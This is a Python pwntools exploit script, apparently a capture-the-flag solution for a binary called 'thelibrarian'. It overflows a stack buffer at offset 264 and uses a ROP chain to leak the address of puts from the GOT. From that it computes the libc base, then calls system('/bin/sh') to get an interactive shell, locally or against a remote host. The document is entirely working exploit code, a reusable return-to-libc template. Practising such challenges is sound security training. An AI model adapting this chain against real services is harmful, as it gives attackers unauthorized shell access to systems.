from pwn import *

def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([exe]+argv, gdbscript=gdbscript, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([exe]+argv, *a, **kwargs)

gdbscript='''
continue
'''

exe='./thelibrarian'
elf=context.binary=ELF(exe)
context.log_level='debug'

libc=ELF('./libc.so.6')

banner=b'Again? Where this time? :'

'''
cyclic_payload=cyclic(500)

io=start()
io.sendlineafter(banner, cyclic_payload)
io.wait()
core=io.corefile

rbp=core.rbp
rsp_offset=cyclic_find(rbp)+8
'''

rsp_offset=264
log.info(f"{rsp_offset=}")

rop=ROP(elf)

pop_rdi_ret_gadget=rop.find_gadget(["pop rdi", "ret"])[0]
got_puts=elf.got.puts
plt_puts=elf.plt.puts
main=elf.symbols.main

leak_payload=flat({rsp_offset: [pop_rdi_ret_gadget, got_puts, plt_puts, main]})

io=start()
io.sendlineafter(banner, leak_payload)
io.recvline()
io.recvline()
io.recvline()
io.recvline()
libc_puts=u64(io.recvline().strip().ljust(8, b"\x00"))
log.info(f"{hex(libc_puts)=}")

libc_puts_offset=libc.symbols.puts
libc_base=libc_puts-libc_puts_offset
log.info(f"{hex(libc_base)=}")

libc_bin_sh_offset=next(libc.search(b'/bin/sh'))
libc_bin_sh=libc_base+libc_bin_sh_offset
log.info(f"{hex(libc_bin_sh)=}")

ret_gadget=rop.find_gadget(['ret'])[0]

libc_system_offset=libc.symbols.system
libc_system=libc_base+libc_system_offset

payload=flat({rsp_offset: [pop_rdi_ret_gadget, libc_bin_sh, ret_gadget, libc_system]})
io.sendlineafter(banner, payload)
io.interactive()



